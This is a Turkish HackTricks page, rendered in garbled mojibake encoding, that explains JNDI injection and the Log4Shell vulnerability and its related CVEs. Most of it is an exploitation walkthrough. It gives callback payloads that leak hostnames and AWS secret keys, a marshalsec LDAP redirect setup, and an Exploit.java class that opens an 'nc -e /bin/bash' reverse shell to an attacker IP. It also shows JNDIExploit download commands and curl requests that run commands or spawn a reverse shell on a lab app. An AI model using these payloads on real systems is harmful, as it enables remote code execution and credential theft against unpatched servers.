# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini edinin**](https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keÅŸfedin (https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

**Try Hard GÃ¼venlik Grubu**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Temel Bilgiler

JNDI, 1990'larÄ±n sonlarÄ±ndan beri Java'ya entegre edilmiÅŸ olup bir dizin hizmeti olarak hizmet verir, Java programlarÄ±nÄ±n veri veya nesneleri bir isimlendirme sistemi aracÄ±lÄ±ÄŸÄ±yla bulmasÄ±nÄ± saÄŸlar. SPI'lar (Hizmet SaÄŸlayÄ±cÄ± Arabirimleri) aracÄ±lÄ±ÄŸÄ±yla Ã§eÅŸitli dizin hizmetlerini destekler ve uzak Java nesneleri de dahil olmak Ã¼zere farklÄ± sistemlerden veri alÄ±nmasÄ±na izin verir. Ortak SPI'lar arasÄ±nda CORBA COS, Java RMI KayÄ±t Defteri ve LDAP bulunur.

### JNDI Ä°simlendirme ReferansÄ±

Java nesneleri, iki ÅŸekilde kullanÄ±larak JNDI Ä°simlendirme ReferanslarÄ± kullanÄ±larak depolanabilir ve alÄ±nabilir:

* **Referans Adresleri**: Bir nesnenin konumunu belirtir (Ã¶rneÄŸin, _rmi://sunucu/ref_), belirtilen adresten doÄŸrudan alÄ±nmasÄ±na izin verir.
* **Uzak Fabrika**: Uzak bir fabrika sÄ±nÄ±fÄ±na referans verir. EriÅŸildiÄŸinde, sÄ±nÄ±f uzak konumdan indirilir ve Ã¶rneklenir.

Ancak, bu mekanizma kÃ¶tÃ¼ye kullanÄ±labilir ve potansiyel olarak keyfi kod yÃ¼klenmesine ve yÃ¼rÃ¼tÃ¼lmesine yol aÃ§abilir. Bir karÅŸÄ± Ã¶nlem olarak:

* **RMI**: JDK 7u21'den itibaren varsayÄ±lan olarak `java.rmi.server.useCodeabseOnly = true`, uzak nesne yÃ¼klemeyi kÄ±sÄ±tlar. Bir GÃ¼venlik YÃ¶neticisi, neyin yÃ¼klenebileceÄŸini daha da sÄ±nÄ±rlar.
* **LDAP**: JDK 6u141, 7u131, 8u121'den itibaren varsayÄ±lan olarak `com.sun.jndi.ldap.object.trustURLCodebase = false`, uzaktan yÃ¼klenen Java nesnelerinin yÃ¼rÃ¼tÃ¼lmesini engeller. `true` olarak ayarlanÄ±rsa, GÃ¼venlik YÃ¶neticisinin denetimine gerek olmaksÄ±zÄ±n uzaktan kod yÃ¼rÃ¼tme mÃ¼mkÃ¼ndÃ¼r.
* **CORBA**: Belirli bir Ã¶zelliÄŸi olmasa da, GÃ¼venlik YÃ¶neticisi her zaman etkindir.

Ancak, JNDI baÄŸlantÄ±larÄ±nÄ± Ã§Ã¶zen **Ä°simlendirme YÃ¶neticisi** iÃ§inde yerleÅŸik gÃ¼venlik mekanizmalarÄ± bulunmamaktadÄ±r, bu da herhangi bir kaynaktan nesnelerin alÄ±nmasÄ±na izin verebilir. Bu durum, RMI, LDAP ve CORBA korumalarÄ±nÄ±n atlatÄ±lmasÄ±na ve keyfi Java nesnelerinin yÃ¼klenmesine veya mevcut uygulama bileÅŸenlerinin (gadget'lar) kÃ¶tÃ¼ amaÃ§lÄ± kod Ã§alÄ±ÅŸtÄ±rmaya yÃ¶nlendirilmesine neden olabilir.

SÃ¶mÃ¼rÃ¼lebilir URL Ã¶rnekleri ÅŸunlarÄ± iÃ§erir:

* _rmi://saldÄ±rgan-sunucu/bar_
* _ldap://saldÄ±rgan-sunucu/bar_
* _iiop://saldÄ±rgan-sunucu/bar_

Koruma Ã¶nlemlerine raÄŸmen, gÃ¼venlik aÃ§Ä±klarÄ±, gÃ¼venilmeyen kaynaklardan JNDI'nin yÃ¼klenmesine karÅŸÄ± koruma olmamasÄ± ve mevcut korumalarÄ±n atlatÄ±lma olasÄ±lÄ±ÄŸÄ± nedeniyle genellikle devam etmektedir.

### JNDI Ã–rneÄŸi

![](<../../.gitbook/assets/image (655) (1) (1).png>)

**`PROVIDER_URL`** ayarlamÄ±ÅŸ olsanÄ±z bile, bir arama yaparken farklÄ± bir URL belirtebilir ve eriÅŸilebilir: `ctx.lookup("<saldÄ±rgan-kontrollÃ¼-url>")` ve bu, bir saldÄ±rganÄ±n kendi kontrolÃ¼nde olan bir sistemden keyfi nesneleri yÃ¼klemek iÃ§in kÃ¶tÃ¼ye kullanacaÄŸÄ± ÅŸeydir.

### CORBA Genel BakÄ±ÅŸ

CORBA (Ortak Nesne Ä°stek Broker Mimarisi), uzak nesneleri benzersiz bir ÅŸekilde tanÄ±mlamak iÃ§in bir **Uyumlu Nesne ReferansÄ± (IOR)** kullanÄ±r. Bu referans, ÅŸunlarÄ± iÃ§eren temel bilgileri iÃ§erir:

* **TÃ¼r KimliÄŸi**: Bir arayÃ¼z iÃ§in benzersiz tanÄ±mlayÄ±cÄ±.
* **Kod TabanÄ±**: Yer tutucu sÄ±nÄ±fÄ±n alÄ±nmasÄ± iÃ§in URL.

Ã–zellikle, CORBA temelde savunmasÄ±z deÄŸildir. Genellikle gÃ¼venliÄŸi saÄŸlamak iÃ§in:

* Bir **GÃ¼venlik YÃ¶neticisi** kurulumu.
* GÃ¼venlik YÃ¶neticisinin potansiyel olarak kÃ¶tÃ¼ amaÃ§lÄ± kod tabanlarÄ±na baÄŸlantÄ±larÄ± izin vermesi iÃ§in yapÄ±landÄ±rÄ±lmasÄ±. Bu, ÅŸunlar aracÄ±lÄ±ÄŸÄ±yla baÅŸarÄ±labilir:
* Soket izni, Ã¶rneÄŸin, `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Dosya okuma izinleri, ya evrensel olarak (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) ya da kÃ¶tÃ¼ amaÃ§lÄ± dosyalarÄ±n yerleÅŸtirilebileceÄŸi belirli dizinler iÃ§in.

Ancak, bazÄ± satÄ±cÄ± politikalarÄ± hoÅŸgÃ¶rÃ¼lÃ¼ olabilir ve bu baÄŸlantÄ±lara varsayÄ±lan olarak izin verebilir.

### RMI BaÄŸlamÄ±

RMI (Uzak YÃ¶ntem Ã‡aÄŸrÄ±sÄ±) iÃ§in durum biraz farklÄ±dÄ±r. CORBA gibi, keyfi sÄ±nÄ±f indirme varsayÄ±lan olarak kÄ±sÄ±tlanmÄ±ÅŸtÄ±r. RMI'yi sÃ¶mÃ¼rmek iÃ§in genellikle GÃ¼venlik YÃ¶neticisini atlatmak gerekir, bu da CORBA'da da geÃ§erlidir.

### LDAP

Ã–ncelikle, Bir **Arama** ile Bir **Arama** arasÄ±nda ayrÄ±m yapmamÄ±z gerekmektedir.\
Bir **arama**, `ldap://localhost:389/o=JNDITutorial` gibi bir URL kullanacaktÄ±r ve LDAP sunucusundan JNDITutorial nesnesini bulacak ve **Ã¶zniteliklerini alacaktÄ±r**.\
Bir **arama**, **isim hizmetleri** iÃ§indir Ã§Ã¼nkÃ¼ **bir isme baÄŸlÄ± olan her ÅŸeyi almak istiyoruz**.

EÄŸer LDAP aramasÄ± **SearchControls.setReturningObjFlag() ile `true` olarak Ã§aÄŸrÄ±ldÄ±ysa, dÃ¶nen nesne yeniden oluÅŸturulacaktÄ±r**.

Bu nedenle, bu seÃ§eneklere saldÄ±rmak iÃ§in birkaÃ§ yol vardÄ±r.\
Bir **saldÄ±rgan, LDAP kayÄ±tlarÄ±nÄ± zehirleyebilir ve bunlara yÃ¼rÃ¼tÃ¼lecek yÃ¼kler ekleyebilir** (LDAP sunucusuna eriÅŸiminiz varsa onlar aracÄ±lÄ±ÄŸÄ±yla onlarca makineyi tehlikeye atmak Ã§ok yararlÄ± olabilir). Bunun baÅŸka bir yolu da Ã¶rneÄŸin bir LDAP aramasÄ±nda **MitM saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmektir**.

Bir uygulamanÄ±n bir JNDI LDAP URL'sini Ã§Ã¶zmesini saÄŸlayabilirseniz, aranacak LDAP'yi kontrol edebilir ve saldÄ±rÄ±yÄ± geri gÃ¶nderebilirsiniz (log4shell).

#### SerileÅŸtirme sÃ¶mÃ¼rÃ¼sÃ¼

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**SÃ¶mÃ¼rÃ¼ serileÅŸtirilir** ve deserialize edilecektir.\
`trustURLCodebase` `true` ise, bir saldÄ±rgan kendi sÄ±nÄ±flarÄ±nÄ± kod tabanÄ±nda saÄŸlayabilir, aksi takdirde sÄ±nÄ±f yolundaki gadget'larÄ± kÃ¶tÃ¼ye kullanmasÄ± gerekecektir.

#### JNDI ReferansÄ± sÃ¶mÃ¼rÃ¼sÃ¼

Bu LDAP'Ä± saldÄ±rmak iÃ§in **JavaFactory referanslarÄ±nÄ±** kullanmak daha kolaydÄ±r:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell Zafiyeti

Zafiyet, Log4j'de tanÄ±mlanan Ã¶zel bir sÃ¶zdizimini desteklediÄŸi iÃ§in ortaya Ã§Ä±kar [**Ã¶zel bir sÃ¶zdizimi**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) `${prefix:name}` ÅŸeklinde, burada `prefix` farklÄ± [**Arama**](https://logging.apache.org/log4j/2.x/manual/lookups.html) tÃ¼rlerinden biri olup `name` deÄŸerlendirilmelidir. Ã–rneÄŸin, `${java:version}` mevcut Ã§alÄ±ÅŸan Java sÃ¼rÃ¼mÃ¼dÃ¼r.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) bir `jndi` Arama Ã¶zelliÄŸi tanÄ±ttÄ±. Bu Ã¶zellik, deÄŸiÅŸkenlerin JNDI aracÄ±lÄ±ÄŸÄ±yla alÄ±nmasÄ±nÄ± saÄŸlar. Genellikle anahtar otomatik olarak `java:comp/env/` ile Ã¶neklenir. Ancak, anahtar kendisi bir **":"** iÃ§eriyorsa, bu varsayÄ±lan Ã¶nek uygulanmaz.

AnahtarÄ±n iÃ§inde bir **:** olduÄŸunda, `${jndi:ldap://Ã¶rnek.com/a}` gibi, **bir Ã¶nek yoktur** ve **LDAP sunucusu nesne iÃ§in sorgulanÄ±r**. Ve bu Aramalar, Log4j'nin yapÄ±landÄ±rmasÄ±nda olduÄŸu gibi kullanÄ±labileceÄŸi gibi, satÄ±rlar gÃ¼nlÃ¼ÄŸe kaydedilirken de kullanÄ±labilir.

Bu nedenle, yalnÄ±zca bir **kullanÄ±cÄ± tarafÄ±ndan kontrol edilen bilgileri iÅŸleyen Log4j'nin savunmasÄ±z bir sÃ¼rÃ¼mÃ¼ne ihtiyaÃ§ duyulur**. Ve Ã§Ã¼nkÃ¼ bu, Java uygulamalarÄ± tarafÄ±ndan geniÅŸ Ã§apta kullanÄ±lan bir kÃ¼tÃ¼phanedir (Ä°nternet Ã¼zerinden eriÅŸilebilen uygulamalar dahil) Ã¶rneÄŸin HTTP baÅŸlÄ±klarÄ±nÄ±n alÄ±ndÄ±ÄŸÄ± gibi log4j'nin Ã§ok yaygÄ±n olarak kullanÄ±ldÄ±ÄŸÄ± Ã§ok yaygÄ±ndÄ±. Ancak, log4j sadece HTTP bilgilerini deÄŸil, geliÅŸtiricinin belirttiÄŸi herhangi bir giriÅŸi ve veriyi kaydetmek iÃ§in kullanÄ±lmaz.
## Log4Shell Ä°lgili CVE'lerin Genel BakÄ±ÅŸÄ±

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Kritik]**

Bu zafiyet, `log4j-core` bileÅŸeninde kritik bir **gÃ¼vensiz serileÅŸtirme aÃ§Ä±ÄŸÄ±** olup, 2.0-beta9'dan 2.14.1'e kadar olan sÃ¼rÃ¼mleri etkilemektedir. **Uzaktan kod yÃ¼rÃ¼tme (RCE)** saÄŸlayarak saldÄ±rganlarÄ±n sistemleri ele geÃ§irmesine olanak tanÄ±r. Sorun, Alibaba Cloud GÃ¼venlik Ekibi'nden Chen Zhaojun tarafÄ±ndan bildirilmiÅŸ olup Ã§eÅŸitli Apache Ã§erÃ§evelerini etkilemektedir. Ä°lk dÃ¼zeltme 2.15.0 sÃ¼rÃ¼mÃ¼nde eksikti. Savunma iÃ§in Sigma kurallarÄ± mevcuttur ([Kural 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Kural 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Kritik]**

BaÅŸlangÄ±Ã§ta dÃ¼ÅŸÃ¼k derecelendirilen ancak daha sonra kritik olarak yÃ¼kseltilen bu CVE, CVE-2021-44228 iÃ§in 2.15.0'da eksik bir dÃ¼zeltmeden kaynaklanan bir **Hizmet Reddi (DoS)** aÃ§Ä±ÄŸÄ±dÄ±r. VarsayÄ±lan olmayan yapÄ±larÄ± etkiler ve saldÄ±rganlarÄ±n oluÅŸturulmuÅŸ yÃ¼kler aracÄ±lÄ±ÄŸÄ±yla DoS saldÄ±rÄ±larÄ±na neden olmalarÄ±na izin verir. Bir [tweet](https://twitter.com/marcioalm/status/1471740771581652995) bir atlatma yÃ¶ntemini sergilemektedir. Sorun, mesaj arama desenlerini kaldÄ±rarak ve JNDI'yi varsayÄ±lan olarak devre dÄ±ÅŸÄ± bÄ±rakarak 2.16.0 ve 2.12.2 sÃ¼rÃ¼mlerinde Ã§Ã¶zÃ¼lmÃ¼ÅŸtÃ¼r.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[YÃ¼ksek]**

`JMSAppender` kullanarak varsayÄ±lan olmayan yapÄ±larÄ± etkileyen bu CVE, gÃ¼vensiz serileÅŸtirme aÃ§Ä±ÄŸÄ±dÄ±r ve 1.x dalÄ± iÃ§in mevcut bir dÃ¼zeltme bulunmamaktadÄ±r, bu dalÄ±n Ã¶mrÃ¼ sona ermiÅŸtir ve `log4j-core 2.17.0`'a yÃ¼kseltme Ã¶nerilir.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Orta]**

Bu zafiyet, Log4j 1.x'in halefi olan **Logback gÃ¼nlÃ¼kleme Ã§erÃ§evesini** etkilemektedir. Ã–nceden gÃ¼venli olduÄŸu dÃ¼ÅŸÃ¼nÃ¼len Ã§erÃ§eve, savunmasÄ±z bulunmuÅŸ ve sorunu ele almak iÃ§in yeni sÃ¼rÃ¼mler (1.3.0-alpha11 ve 1.2.9) yayÄ±mlanmÄ±ÅŸtÄ±r.

### **CVE-2021-45105** **\[YÃ¼ksek]**

Log4j 2.16.0, bir DoS aÃ§Ä±ÄŸÄ± iÃ§ermekte olup, CVE'yi dÃ¼zeltmek iÃ§in `log4j 2.17.0` sÃ¼rÃ¼mÃ¼nÃ¼n yayÄ±nlanmasÄ±nÄ± gerektirmiÅŸtir. Daha fazla ayrÄ±ntÄ±ya BleepingComputer'Ä±n [raporunda](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) yer almaktadÄ±r.

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Log4j sÃ¼rÃ¼m 2.17'yi etkileyen bu CVE, saldÄ±rganÄ±n log4j'in yapÄ±landÄ±rma dosyasÄ±nÄ± kontrol etmesini gerektirir. YapÄ±landÄ±rÄ±lmÄ±ÅŸ bir JDBCAppender aracÄ±lÄ±ÄŸÄ±yla potansiyel keyfi kod yÃ¼rÃ¼tme iÃ§ermektedir. Daha fazla ayrÄ±ntÄ± [Checkmarx blog gÃ¶nderisinde](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) bulunmaktadÄ±r.

## Log4Shell SÃ¶mÃ¼rÃ¼sÃ¼

### KeÅŸif

Bu zafiyet, korumasÄ±zsa belirttiÄŸiniz adres iÃ§in en az bir **DNS isteÄŸi** gÃ¶ndereceÄŸinden keÅŸfetmesi Ã§ok kolaydÄ±r. Bu nedenle, ÅŸu gibi yÃ¼kler:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` ([canarytokens.com](https://canarytokens.org/generate) kullanarak)
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` ([interactsh](https://github.com/projectdiscovery/interactsh) kullanarak)
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (Burp Suite kullanarak)
* `${jndi:ldap://2j4ayo.dnslog.cn}` ([dnslog](http://dnslog.cn) kullanarak)
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` ([huntress](https://log4shell.huntress.com) kullanarak)

**Bir DNS isteÄŸi alÄ±nsa bile uygulamanÄ±n sÃ¶mÃ¼rÃ¼lebilir** (veya hatta savunmasÄ±z) olduÄŸu anlamÄ±na gelmez, bunu sÃ¶mÃ¼rmeye Ã§alÄ±ÅŸmanÄ±z gerekecektir.

{% hint style="info" %}
**2.15 sÃ¼rÃ¼mÃ¼nÃ¼ sÃ¶mÃ¼rmek iÃ§in** **localhost kontrol atlatma** eklemeniz gerekmektedir: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Yerel KeÅŸif**

KÃ¼tÃ¼phanenin **yerel savunmasÄ±z sÃ¼rÃ¼mlerini** aramak iÃ§in:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **DoÄŸrulama**

Ã–nceki listelenen platformlardan bazÄ±larÄ±, istendiÄŸinde kaydedilecek bazÄ± deÄŸiÅŸken verileri eklemenize izin verecektir.\
Bu, 2 ÅŸey iÃ§in Ã§ok faydalÄ± olabilir:

* Zafiyeti **doÄŸrulamak** iÃ§in
* Zafiyeti istismar ederek bilgi **dÄ±ÅŸarÄ± Ã§Ä±karmak** iÃ§in

Ã–rneÄŸin ÅŸÃ¶yle bir ÅŸey isteyebilirsiniz:\
veya `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** gibi ve bir **DNS isteÄŸi, ortam deÄŸiÅŸkeninin deÄŸeriyle alÄ±ndÄ±ÄŸÄ±nda**, uygulamanÄ±n zafiyetli olduÄŸunu bilirsiniz.

Denemeye Ã§alÄ±ÅŸabileceÄŸiniz diÄŸer bilgiler:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Bilgisi

{% hint style="info" %}
JDK sÃ¼rÃ¼mleri 6u141'den yÃ¼ksek, 7u131'den yÃ¼ksek veya 8u121'den yÃ¼ksek olan ana bilgisayarlar, LDAP sÄ±nÄ±f yÃ¼kleme saldÄ±rÄ± vektÃ¶rÃ¼ne karÅŸÄ± korunmaktadÄ±r. Bu, `com.sun.jndi.ldap.object.trustURLCodebase`'in varsayÄ±lan olarak devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ±ndan kaynaklanmaktadÄ±r, bu da JNDI'nin LDAP aracÄ±lÄ±ÄŸÄ±yla uzak bir kod tabanÄ±nÄ± yÃ¼klemesini engeller. Bununla birlikte, bu sÃ¼rÃ¼mlerin **serileÅŸtirme saldÄ±rÄ± vektÃ¶rÃ¼ne karÅŸÄ± korunmadÄ±ÄŸÄ±nÄ±** unutmamak Ã¶nemlidir.

Bu daha yÃ¼ksek JDK sÃ¼rÃ¼mlerini sÃ¶mÃ¼rmeyi amaÃ§layan saldÄ±rganlar iÃ§in Java uygulamasÄ± iÃ§inde bir **gÃ¼venilir cihaz** kullanmak gereklidir. Bu amaÃ§la genellikle ysoserial veya JNDIExploit gibi araÃ§lar kullanÄ±lÄ±r. Ã–te yandan, daha dÃ¼ÅŸÃ¼k JDK sÃ¼rÃ¼mlerini sÃ¶mÃ¼rmek nispeten daha kolaydÄ±r Ã§Ã¼nkÃ¼ bu sÃ¼rÃ¼mler, keyfi sÄ±nÄ±flarÄ± yÃ¼klemek ve yÃ¼rÃ¼tmek iÃ§in manipÃ¼le edilebilir.

**Daha fazla bilgi iÃ§in** (_RMI ve CORBA vektÃ¶rlerindeki kÄ±sÄ±tlamalar gibi_) **Ã¶nceki JNDI Naming Referans bÃ¶lÃ¼mÃ¼nÃ¼** kontrol edin veya [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) adresini ziyaret edin.
{% endhint %}

### RCE - Ã–zel yÃ¼k ile Marshalsec

Bu iÅŸlemi **THM kutusunda** test edebilirsiniz: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

[**marshalsec**](https://github.com/mbechler/marshalsec) aracÄ±nÄ± kullanÄ±n (jar sÃ¼rÃ¼mÃ¼ [**burada**](https://github.com/RandomRobbieBF/marshalsec-jar) mevcuttur). Bu yaklaÅŸÄ±m, bir LDAP yÃ¶nlendirme sunucusu oluÅŸturarak baÄŸlantÄ±larÄ± ikincil bir HTTP sunucusuna yÃ¶nlendirir ve saldÄ±rÄ±nÄ±n barÄ±ndÄ±rÄ±lacaÄŸÄ± yerdir:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Hedefi ters kabuk kodunu yÃ¼klemeye zorlamak iÃ§in aÅŸaÄŸÄ±daki iÃ§eriÄŸe sahip `Exploit.java` adÄ±nda bir Java dosyasÄ± oluÅŸturun:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Java dosyasÄ±nÄ± bir sÄ±nÄ±f dosyasÄ±na derlemek iÃ§in ÅŸunu kullanÄ±n: `javac Exploit.java -source 8 -target 8`. ArdÄ±ndan, sÄ±nÄ±f dosyasÄ±nÄ± iÃ§eren dizinde ÅŸu komutla bir **HTTP sunucusu** baÅŸlatÄ±n: `python3 -m http.server`. **marshalsec LDAP sunucusunun** bu HTTP sunucusuna referans verdiÄŸinden emin olun.

Hassas web sunucusunda exploit sÄ±nÄ±fÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesini tetiklemek iÃ§in ÅŸu ÅŸekilde bir yÃ¼k gÃ¶nderin:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Not:** Bu aÃ§Ä±k, Java'nÄ±n LDAP aracÄ±lÄ±ÄŸÄ±yla uzaktan kod tabanÄ± yÃ¼kleme izin veren yapÄ±landÄ±rmasÄ±na dayanmaktadÄ±r. Bu izin verilmiyorsa, keyfi kod yÃ¼rÃ¼tme iÃ§in gÃ¼venilen bir sÄ±nÄ±fÄ± sÃ¶mÃ¼rmeyi dÃ¼ÅŸÃ¼nebilirsiniz.

### RCE - **JNDIExploit**

{% hint style="info" %}
BazÄ± nedenlerden dolayÄ± yazar, log4shell keÅŸfinden sonra bu projeyi github'dan kaldÄ±rmÄ±ÅŸtÄ±r. Bir Ã¶nbelleklenmiÅŸ sÃ¼rÃ¼mÃ¼ [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) adresinde bulabilirsiniz ancak yazarÄ±n kararÄ±na saygÄ± duymak isterseniz bu zafiyeti sÃ¶mÃ¼rmek iÃ§in farklÄ± bir yÃ¶ntem kullanÄ±n.

AyrÄ±ca, kaynak kodunu wayback machine'de bulamazsÄ±nÄ±z, bu nedenle ya kaynak kodunu analiz edin ya da neyi yÃ¼rÃ¼ttÃ¼ÄŸÃ¼nÃ¼zÃ¼ bilmediÄŸinizi bilerek jar dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n.
{% endhint %}

Bu Ã¶rnekte, **log4shell'e karÅŸÄ± savunmasÄ±z web sunucusunu** 8080 numaralÄ± portta Ã§alÄ±ÅŸtÄ±rabilirsiniz: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_README'de nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± bulabilirsiniz_). Bu savunmasÄ±z uygulama, HTTP isteÄŸi baÅŸlÄ±ÄŸÄ± _X-Api-Version_'Ä±n iÃ§eriÄŸini log4shell'in savunmasÄ±z bir sÃ¼rÃ¼mÃ¼yle gÃ¼nlÃ¼yor.

Daha sonra, **JNDIExploit** jar dosyasÄ±nÄ± indirip ÅŸu ÅŸekilde Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
KodlarÄ± sadece birkaÃ§ dakika okuduktan sonra, _com.feihong.ldap.LdapServer_ ve _com.feihong.ldap.HTTPServer_ dosyalarÄ±nda **LDAP ve HTTP sunucularÄ±nÄ±n nasÄ±l oluÅŸturulduÄŸunu** gÃ¶rebilirsiniz. LDAP sunucusu, hangi yÃ¼kÃ¼n hizmet edilmesi gerektiÄŸini anlayacak ve kurbanÄ± HTTP sunucusuna yÃ¶nlendirecek, bu sunucu ise saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirecektir.\
_com.feihong.ldap.gadgets_ iÃ§inde **kullanÄ±labilecek bazÄ± belirli cihazlar** bulabilirsiniz (potansiyel olarak keyfi kod yÃ¼rÃ¼tmek iÃ§in). Ve _com.feihong.ldap.template_ iÃ§inde **saldÄ±rÄ±larÄ± oluÅŸturacak** farklÄ± ÅŸablon sÄ±nÄ±flarÄ±nÄ± gÃ¶rebilirsiniz.

TÃ¼m mevcut saldÄ±rÄ±larÄ± **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** komutu ile gÃ¶rebilirsiniz. BazÄ± faydalÄ± olanlar:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Yani, Ã¶rneÄŸimizde zaten o docker aÃ§Ä±ÄŸÄ± olan uygulama Ã§alÄ±ÅŸÄ±yor. Ona saldÄ±rmak iÃ§in:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
